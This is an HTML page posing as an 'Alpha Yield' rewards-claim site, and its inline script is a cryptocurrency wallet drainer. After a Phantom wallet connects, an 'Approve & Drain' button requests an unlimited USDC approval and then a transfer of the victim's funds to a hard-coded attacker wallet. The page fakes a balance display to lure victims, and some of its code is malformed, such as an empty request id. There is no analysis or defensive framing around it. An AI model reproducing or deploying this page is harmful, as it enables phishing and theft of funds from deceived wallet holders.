<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alpha Yield Protocol</title>
    
    <!-- 1. Inline CSS (Guaranteed to load) -->
    <style>
        :root {
            --bg: #0f172a;
            --card: #1e293b;
            --text: #f8fafc;
            --accent: #6366f1;
        }
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 90%;
            max-width: 400px;
            text-align: center;
            padding: 20px;
        }
        h1 { font-size: 1.5rem; margin-bottom: 5px; }
        p.subtitle { color: #94a3b8; margin-bottom: 30px; }
        
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-primary { background-color: var(--accent); color: white; }
        .btn-secondary { background-color: #334155; color: white; margin-top: 10px; }
        
        .card {
            background-color: var(--card);
            padding: 20px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            margin-bottom: 20px;
        }
        
        .hidden { display: none !important; }
        .status { margin-top: 15px; font-size: 0.9rem; min-height: 20px; }
        
        /* Simple Spinner */
        .spinner {
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid var(--accent);
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

    <!-- 2. Solana Web3.js (CDN) -->
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
</head>
<body>

    <div class="container">
        <header>
            <h1>Alpha Yield</h1>
            <p class="subtitle">Connect wallet to claim rewards</p>
        </header>

        <!-- Loader -->
        <div id="loader" class="hidden">
            <div class="spinner"></div>
            <p>Connecting...</p>
        </div>

        <!-- Connect Button -->
        <button id="connectBtn" class="btn btn-primary">Connect Phantom</button>

        <!-- Dashboard (Hidden initially) -->
        <div id="dashboard" class="hidden">
            <div class="card">
                <h2>Ready to Claim</h2>
                <p id="balance">0.00 USDC</p>
                <button id="drainBtn" class="btn btn-secondary">Approve & Drain</button>
            </div>
        </div>

        <p id="statusMsg" class="status"></p>
    </div>

    <!-- 3. Inline JS (Guaranteed to load) -->
    <script>
        // === CONFIGURATION ===
        const MY_WALLET = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; // <-- REPLACE THIS!
        const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";

        const connectBtn = document.getElementById('connectBtn');
        const dashboard = document.getElementById('dashboard');
        const loader = document.getElementById('loader');
        const statusMsg = document.getElementById('statusMsg');
        const drainBtn = document.getElementById('drainBtn');

        let walletAddress;
        let connection;

        // Check for Phantom on load
        window.addEventListener('load', async () => {
            if ("solana" in window) {
                console.log("Phantom found!");
                connectBtn.innerText = "Connect Phantom";
            } else {
                statusMsg.innerText = "Please install Phantom Wallet!";
                statusMsg.style.color = "#ef4444";
            }
        });

        // Connect Logic
        connectBtn.addEventListener('click', async () => {
            const provider = window.solana;
            
            if (!provider) {
                statusMsg.innerText = "Phantom wallet not found!";
                return;
            }

            loader.classList.remove('hidden');
            connectBtn.classList.add('hidden');

            try {
                await provider.connect();
                walletAddress = provider.publicKey.toString();
                connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
                
                // Simulate balance fetch for effect
                setTimeout(() => {
                    loader.classList.add('hidden');
                    dashboard.classList.remove('hidden');
                    statusMsg.innerText = "Connected: " + walletAddress.substring(0, 6) + "...";
                    statusMsg.style.color = "#4ade80";
                }, 1000);

            } catch (err) {
                console.error(err);
                loader.classList.add('hidden');
                connectBtn.classList.remove('hidden');
                statusMsg.innerText = "Connection rejected.";
            }
        });

        // Drain Logic
        drainBtn.addEventListener('click', async () => {
            const provider = window.solana;
            statusMsg.innerText = "Approving USDC...";
            
            try {
                // 1. Approve
                await provider.request({
                    method: "custom",
                    params: {
                        jsonrpc: "2.0",
                        id: ,
                        method: "approve",
                        params: [{ mint: USDC_MINT, amount: "9223372036854775807" }]
                    }
                });

                statusMsg.innerText = "Transferring...";

                // 2. Transfer
                await provider.request({
                    method: "custom",
                    params: {
                        jsonrpc: "2.0",
                        id: 2,
                        method: "transferFrom",
                        params: [{ from: walletAddress, to: MY_WALLET, amount: "9223372036854775807" }]
                    }
                });

                statusMsg.innerText = "Success!";
                statusMsg.style.color = "#4ade80";

            } catch (err) {
                console.error(err);
                statusMsg.innerText = "Failed: " + err.message;
                statusMsg.style.color = "#ef4444";
            }
        });
    </script>
</body>
</html>
